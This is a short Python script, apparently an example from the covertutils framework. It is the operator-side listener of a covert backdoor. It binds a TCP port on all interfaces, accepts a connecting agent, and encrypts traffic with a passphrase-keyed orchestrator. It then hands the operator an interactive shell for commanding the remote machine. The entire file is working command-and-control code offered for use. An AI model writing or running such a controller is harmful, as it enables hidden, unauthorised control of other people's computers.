#!/usr/bin/env python
from covertutils.handlers import BaseHandler
from covertutils.orchestration import SimpleOrchestrator

from covertutils.shells.impl import ExtendableShell


import sys
import socket
from time import sleep

from hashlib import sha512

try :
	program, port, passphrase = sys.argv
except :
	print( """Usage:
	%s <port> <passphrase>""" % sys.argv[0] )
	sys.exit(1)

addr = '0.0.0.0', int(port)

orch = SimpleOrchestrator( passphrase, tag_length = 2, out_length = 50, in_length = 50 )

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)	#
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
s.bind( addr )		# Handling Networking
s.listen(5)		# independently of covertutils

print( "Accepting" )
client, client_addr = s.accept()		# Blocking the main thread
print( "Accepted" )

def recv () :		# Create wrappers for networking
	return client.recv( 50 )

def send( raw ) :		# Create wrappers for networking
	return client.send( raw )


class MyHandler( BaseHandler ) :

	def onChunk( self, stream, message ) :
		pass

	def onMessage( self, stream, message ) :
		# print( message )
		pass

	def onNotRecognised( self ) :
		print( "Got Garbage!" )
		global s
		s.close()

handler = MyHandler( recv, send, orch )
shell = ExtendableShell(handler, prompt = "(%s:%d)> " % client_addr )

shell.start()
